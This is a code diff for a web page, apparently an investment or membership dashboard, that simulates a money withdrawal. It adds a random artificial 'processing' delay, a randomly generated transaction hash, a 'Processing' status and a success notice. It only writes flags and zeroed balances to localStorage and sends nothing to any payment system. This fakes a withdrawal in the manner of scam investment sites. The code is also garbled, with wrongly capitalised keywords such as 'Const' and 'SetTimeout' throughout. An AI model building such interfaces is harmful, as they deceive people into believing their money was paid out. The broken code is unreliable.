+    Const successScreen = document.getElementById("success-screen");
+
+    ConfirmBtn.addEventListener("click", () => {
+        LoadingScreen.classList.add("active");
+        ConfirmBtn.disabled = true;
+
+        Const minTime = 2500;
+        Const maxTime = 4500; 
+        Const dynamicProcessingDelay = Math.floor(Math.random() * (maxTime - minTime + 1)) + minTime;
+
+        SetTimeout(() => {
+            // Set withdrawal state sync flags
+            LocalStorage.setItem('av_is_withdrawn', 'true');
+            LocalStorage.setItem('av_withdrawn', 'true'); 
+
+            Const currentMoment = new Date();
+            Const timestampString = currentMoment.toLocaleDateString('en-US', {
+                Month: 'short', day: '2-digit', year: 'numeric'
+            }) + `, ` + currentMoment.toLocaleTimeString('en-US', {
+                Hour: '2-digit', minute: '2-digit', hour12: true
             });
+            LocalStorage.setItem("av_withdrawal_time", timestampString);
 
-            document.getElementById("close-btn").addEventListener("click", () => {
-                window.location.href = "https://membership.avalonflow.site/dashboard";
-            });
-        }
+            // Record detailed withdrawal transaction payload for history engine
+            Const withdrawnAmount = runtimeSessionData.availableBalanceCAD;
+            Const txData = {
+                TxHash: generateRandomHash(),
+                AmountCAD: withdrawnAmount,
+                Method: runtimeSessionData.selectedAssetOrBank,
+                Time: timestampString,
+                Status: "Processing"
+            };
+            LocalStorage.setItem("av_withdrawal_tx", JSON.stringify(txData));
+
+            // Sync zero balances in storage
+            LocalStorage.setItem("totalACU", "0.00");
+            LocalStorage.setItem("baseACU", "0.00");
+            LocalStorage.setItem("av_retention_bonus", "0.00");
+
+            RuntimeSessionData.balanceUnlockedFlag = true;
+
+            LoadingScreen.classList.remove("active");
+            SuccessScreen.classList.add("active");
+            ShowNotification("Withdrawal routed to clearway terminal queue", 4000);
+        }, dynamicProcessingDelay); 
+    });
+
+    Document.getElementById("close-btn").addEventListener("click", () => {
+        Window.location.href = "https://membership.avalonflow.site/dashboard";
+    });
+}
 </script>
 </body>
 </html>
